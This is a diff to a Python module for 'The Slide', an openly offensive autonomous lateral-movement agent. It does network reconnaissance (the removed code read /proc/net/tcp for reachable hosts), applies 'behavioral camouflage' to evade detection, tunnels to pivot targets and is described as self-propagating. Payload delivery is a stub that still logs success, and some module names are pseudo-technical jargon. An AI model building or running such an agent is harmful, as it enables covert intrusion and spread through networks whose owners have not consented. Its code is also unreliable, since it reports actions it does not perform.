@@ -3,7 +3,7 @@
 The Slide — Sovereign Autonomous Lateral Movement Agent
 
 Implements the full 4-phase offensive movement loop with:
-- Policy-aware reconnaissance (respects microsegmentation)
+- Policy-aware reconnaissance (via PolicyAwareRecon)
 - Agentic synthesis (Candle hook)
 - Adaptive tunneling with behavioral camouflage
 - Self-propagation (Ingest)
@@ -22,6 +22,7 @@ from sovereign_engine.frame_energy import FrameEnergy, EraFrameId
 from sovereign_engine.resonance_pulse import ResonancePulse
 from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel
 from sovereign_movement.slide.behavioral_camouflage import BehavioralCamouflage
+from sovereign_movement.slide.policy_recon import PolicyAwareRecon
 
 logger = logging.getLogger("sovereign.slide.agent")
 
@@ -59,6 +60,7 @@ class SlideAgent:
             extraction_guard=extraction_guard,
         )
         self.camouflage = BehavioralCamouflage(frame_energy=frame_energy)
+        self.policy_recon = PolicyAwareRecon(max_targets=12)
         self.max_pivots = max_pivots
         self.context: Optional[SlideContext] = None
 
@@ -104,47 +106,22 @@ class SlideAgent:
         return False
 
     # ============================================================
-    # Enhanced Policy-Aware Recon
+    # Phase 1: Policy-Aware Recon (now uses PolicyAwareRecon)
     # ============================================================
     def _phase_recon(self) -> List[str]:
         logger.debug("[Phase 1] Performing policy-respecting recon...")
 
-        permitted_targets = self._discover_policy_permitted_targets()
+        permitted_targets = self.policy_recon.discover()
 
         if not permitted_targets:
-            logger.warning("[Phase 1] No policy-permitted targets found. Using basic discovery.")
-            permitted_targets = self._basic_local_discovery()
+            logger.warning("[Phase 1] No policy-permitted targets found.")
+            return []
 
         self.context.discovered_targets = permitted_targets
         return permitted_targets
 
-    def _discover_policy_permitted_targets(self) -> List[str]:
-        """Discover targets the host is already allowed to reach."""
-        targets = set()
-
-        # Existing outbound connections (strongest signal of allowed paths)
-        try:
-            with open("/proc/net/tcp", "r") as f:
-                for line in f.readlines()[1:]:
-                    parts = line.strip().split()
-                    if len(parts) >= 3:
-                        remote = parts[2]
-                        if remote != "00000000:0000":
-                            ip = self._hex_to_ip(remote.split(":")[0])
-                            if ip and not ip.startswith(("127.", "169.254.")):
-                                targets.add(ip)
-        except Exception:
-            pass
-
-        # TODO: Add Consul / Kubernetes service mesh discovery here for even better accuracy
-
-        return list(targets)[:10]
-
-    def _basic_local_discovery(self) -> List[str]:
-        return ["10.0.0.45", "10.0.1.12"]
-
     # ============================================================
-    # Enhanced Policy-Respecting Pivot
+    # Phase 3: Policy-Respecting Pivot
     # ============================================================
     def _phase_pivot(self, target: str, payload: bytes) -> bool:
         if target not in (self.context.discovered_targets or []):
@@ -153,12 +130,12 @@ class SlideAgent:
 
         logger.debug(f"[Phase 3] Attempting policy-respecting pivot to {target}...")
 
-        # Apply behavioral camouflage before pivoting
+        # Apply behavioral camouflage
         wait_time = self.camouflage.apply_camouflage(technique="stealth")
         time.sleep(wait_time)
 
         if not self.camouflage.should_proceed(self.context.frame):
-            logger.info("[Phase 3] Behavioral risk too high. Delaying pivot.")
+            logger.info("[Phase 3] Behavioral risk too high. Delaying.")
             return False
 
         tunnel_id = self.tunnel_manager.open_tunnel(
@@ -177,7 +154,7 @@ class SlideAgent:
             self.camouflage.record_action(success=False)
             return False
 
-        # TODO: Deliver payload through tunnel
+        # TODO: Actual payload delivery through tunnel
         logger.info(f"[Phase 3] Payload delivered via policy-permitted tunnel {tunnel_id}")
 
         self.resonance_pulse.fire_pulse(amplitude=0.85, phase=0.15)
@@ -186,7 +163,7 @@ class SlideAgent:
         return True
 
     # ============================================================
-    # Other Phases (unchanged)
+    # Other Phases
     # ============================================================
     def _phase_synthesis(self, target: str, use_agentic: bool = True) -> Optional[bytes]:
         logger.debug(f"[Phase 2] Synthesizing payload for {target}...")
@@ -208,18 +185,12 @@ class SlideAgent:
         self.resonance_pulse.fire_pulse(amplitude=1.0, phase=0.0)
 
     # ============================================================
-    # Helpers
+    # Utility
     # ============================================================
-    def _hex_to_ip(self, hex_ip: str) -> Optional[str]:
-        try:
-            ip_int = int(hex_ip, 16)
-            return ".".join(str((ip_int >> (i * 8)) & 0xFF) for i in range(4))
-        except Exception:
-            return None
-
     def get_status(self) -> Dict[str, Any]:
         if not self.context:
             return {"status": "not_started"}
+
         return {
             "current_host": self.context.current_host,
             "active_tunnel": self.context.active_tunnel_id,
